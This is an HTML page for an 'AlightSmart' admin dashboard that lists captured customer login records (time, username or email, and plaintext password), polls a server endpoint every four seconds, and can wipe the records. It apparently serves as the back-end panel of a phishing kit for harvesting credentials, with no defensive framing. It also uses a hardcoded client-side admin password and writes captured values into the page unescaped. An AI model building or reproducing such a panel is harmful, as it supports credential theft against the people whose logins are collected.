<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Admin Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #f8fafc;
            padding: 15px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #1e40af;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            font-size: 1.8rem;
        }
        .controls {
            padding: 15px 20px;
            background: #f1f5f9;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 14px 12px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }
        th {
            background: #e2e8f0;
            font-weight: 600;
        }
        tr:hover {
            background: #f8fafc;
        }
        .clear-btn {
            background: #ef4444;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
        }
        .empty {
            text-align: center;
            padding: 50px 20px;
            color: #64748b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 AlightSmart Admin Dashboard</h1>
            <p>Customer Login Records</p>
        </div>

        <div class="controls">
            <h2>All Login Records</h2>
            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All</button>
        </div>

        <table id="recordsTable">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Username / Email</th>
                    <th>Password</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>

        <div id="emptyMessage" class="empty" style="display: none;">
            No login records yet.
        </div>
    </div>

    <script>
        const ADMIN_PASSWORD = "tunde123";   // Change this to your secure password

        // Simple password protection
        function checkAdminAccess() {
            const pass = prompt("Enter Admin Password:");
            if (pass !== ADMIN_PASSWORD) {
                alert("❌ Access Denied");
                window.location.href = "/";
                return;
            }
            loadRecords();
        }

        async function loadRecords() {
            try {
                const res = await fetch('/api/records');
                const records = await res.json();
                const tbody = document.querySelector('#recordsTable tbody');
                tbody.innerHTML = '';

                if (records.length === 0) {
                    document.getElementById('emptyMessage').style.display = 'block';
                    return;
                }

                document.getElementById('emptyMessage').style.display = 'none';

                records.forEach(r => {
                    tbody.innerHTML += `
                        <tr>
                            <td>${r.timestamp}</td>
                            <td><strong>${r.username}</strong></td>
                            <td><code>${r.password}</code></td>
                        </tr>`;
                });
            } catch (err) {
                console.error(err);
            }
        }

        async function clearRecords() {
            if (confirm("⚠️ Delete ALL login records permanently?")) {
                await fetch('/api/clear', { method: 'POST' });
                loadRecords();
            }
        }

        // Auto refresh every 4 seconds
        setInterval(loadRecords, 4000);

        // Start
        window.onload = checkAdminAccess;
    </script>
</body>
</html>
